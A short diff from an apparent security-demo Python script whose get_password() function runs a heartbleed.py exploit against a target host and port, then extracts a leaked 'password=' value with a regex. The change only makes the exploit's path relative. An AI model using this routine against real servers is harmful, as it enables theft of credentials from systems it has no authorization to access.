@@ -79,7 +79,7 @@ def get_password():
 	vulnerable_port = ports[2]
 
 	print('Performing heartbleed attack to obtain password...')
-	output = subprocess.check_output(["python2.7", "/home/rivak/Desktop/SQL-Injection-Demo/heartbleed.py", hostname, "-p", vulnerable_port, "-n", count, "-v" ])
+	output = subprocess.check_output(["python2.7", "./heartbleed.py", hostname, "-p", vulnerable_port, "-n", count, "-v" ])
 	output_str = output.decode("utf-8")
 	pattern = r'password=([^\s&]*)'
 	match = re.search(pattern, output_str)
